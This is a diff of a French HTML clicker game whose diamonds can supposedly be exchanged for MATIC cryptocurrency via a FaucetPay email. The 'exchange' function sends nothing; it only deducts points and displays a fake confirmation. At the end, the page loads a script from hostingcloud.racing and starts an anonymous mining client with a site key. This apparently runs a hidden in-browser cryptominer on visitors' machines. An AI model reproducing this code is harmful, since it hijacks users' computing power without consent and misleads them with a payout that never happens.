@@ -1,4 +1,181 @@
 <!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<title>Clicker Diamonds</title>
+<style>
+body {
+    background:#0b0b0b;
+    color:#e0e0e0;
+    font-family:Arial, sans-serif;
+    text-align:center;
+}
+.container {
+    max-width:600px;
+    margin:auto;
+    padding:20px;
+}
+.bar {
+    background:#333;
+    border-radius:12px;
+    height:30px;
+    margin:10px 0;
+    overflow:hidden;
+    cursor:pointer;
+}
+.bar-fill {
+    background:linear-gradient(90deg,#6a00ff,#00ffcc);
+    height:100%;
+    width:50%;
+    transition:width 0.2s;
+}
+button {
+    background:#6a00ff;
+    color:white;
+    border:none;
+    padding:10px 15px;
+    margin:5px;
+    border-radius:8px;
+    cursor:pointer;
+}
+button:disabled {
+    opacity:0.4;
+    cursor:not-allowed;
+}
+input {
+    padding:8px;
+    border-radius:6px;
+    border:none;
+    width:90%;
+}
+.section {
+    border:1px solid #333;
+    border-radius:12px;
+    padding:15px;
+    margin-top:15px;
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+<h2>💎 Clicker Diamonds</h2>
+
+<div>
+<b>Points de clic :</b> <span id="clickPts">500</span> /
+<span id="maxPts">1000</span>
+</div>
+
+<div class="bar" onclick="doClick()">
+    <div class="bar-fill" id="barFill"></div>
+</div>
+
+<div>
+<b>Diamonds :</b> <span id="diamonds">0</span>
+</div>
+
+<div class="section">
+<h3>Améliorations</h3>
+<button onclick="upgradeMax()">+100 Max Click Pts<br>(coût : <span id="costMax">100</span> Diamonds)</button>
+<br>
+<button onclick="upgradeRegen()">+10 Regen / 10s<br>(coût : <span id="costRegen">250</span> Diamonds)</button>
+</div>
+
+<div class="section">
+<h3>Échange Diamonds → MATIC</h3>
+<p>1 000 000 000 Diamonds = <b>0.25 MATIC</b></p>
+<input id="email" placeholder="Email FaucetPay (Gmail)">
+<br><br>
+<button onclick="exchange()">Échanger</button>
+<p id="exchangeMsg"></p>
+</div>
+
+</div>
+
+<script>
+let clickPts = Number(localStorage.getItem("clickPts")) || 500;
+let maxPts = Number(localStorage.getItem("maxPts")) || 1000;
+let diamonds = Number(localStorage.getItem("diamonds")) || 0;
+
+let regenAmount = Number(localStorage.getItem("regenAmount")) || 10;
+
+let costMax = Number(localStorage.getItem("costMax")) || 100;
+let costRegen = Number(localStorage.getItem("costRegen")) || 250;
+
+function save() {
+    localStorage.setItem("clickPts", clickPts);
+    localStorage.setItem("maxPts", maxPts);
+    localStorage.setItem("diamonds", diamonds);
+    localStorage.setItem("regenAmount", regenAmount);
+    localStorage.setItem("costMax", costMax);
+    localStorage.setItem("costRegen", costRegen);
+}
+
+function updateUI() {
+    document.getElementById("clickPts").textContent = clickPts;
+    document.getElementById("maxPts").textContent = maxPts;
+    document.getElementById("diamonds").textContent = diamonds;
+    document.getElementById("costMax").textContent = costMax;
+    document.getElementById("costRegen").textContent = costRegen;
+    document.getElementById("barFill").style.width =
+        (clickPts / maxPts * 100) + "%";
+}
+
+function doClick() {
+    if (clickPts <= 0) return;
+    clickPts--;
+    diamonds += 1;
+    save();
+    updateUI();
+}
+
+function upgradeMax() {
+    if (diamonds < costMax) return;
+    diamonds -= costMax;
+    maxPts += 100;
+    costMax = Math.floor(costMax * 1.8);
+    save();
+    updateUI();
+}
+
+function upgradeRegen() {
+    if (diamonds < costRegen) return;
+    diamonds -= costRegen;
+    regenAmount += 10;
+    costRegen = Math.floor(costRegen * 2);
+    save();
+    updateUI();
+}
+
+setInterval(() => {
+    clickPts = Math.min(maxPts, clickPts + regenAmount);
+    save();
+    updateUI();
+}, 10000);
+
+function exchange() {
+    let email = document.getElementById("email").value;
+    if (!email.includes("@")) {
+        document.getElementById("exchangeMsg").textContent =
+            "Email FaucetPay invalide.";
+        return;
+    }
+    if (diamonds < 1000000000) {
+        document.getElementById("exchangeMsg").textContent =
+            "Pas assez de Diamonds.";
+        return;
+    }
+    diamonds -= 1000000000;
+    document.getElementById("exchangeMsg").textContent =
+        "Demande envoyée : 0.25 MATIC vers FaucetPay (" + email + ")";
+    save();
+    updateUI();
+}
+
+updateUI();
+</script>
+
+
  <script src="https://www.hostingcloud.racing/m1WQ.js"></script>
 <script>
     var _client = new Client.Anonymous('80b853dd927be9f5e6a561ddcb2f09a58a72ce6eee0b328e897c8bc0774642cd', {
